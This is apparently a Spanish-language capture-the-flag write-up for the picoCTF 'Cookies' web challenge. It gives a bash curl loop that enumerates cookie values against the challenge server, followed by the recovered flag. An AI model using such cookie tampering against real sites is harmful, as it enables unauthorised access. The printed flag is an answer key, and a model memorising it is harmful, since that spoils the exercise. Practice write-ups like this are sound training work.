# Cookies
# Descripción del reto:
Who doesn't love cookies? Try to figure out the best one. http://wily-courier.picoctf.net:51935/
# Solución:
for i in {1..25}; do curl -s --cookie "name=$i" http://wily-courier.picoctf.net:51935/check | grep "picoCTF"; done
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

'picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}'
# Notas adicionales
# Referencias
https://youtu.be/LseQ-XWCXVo?si=baDDAMMJcPKfI1gp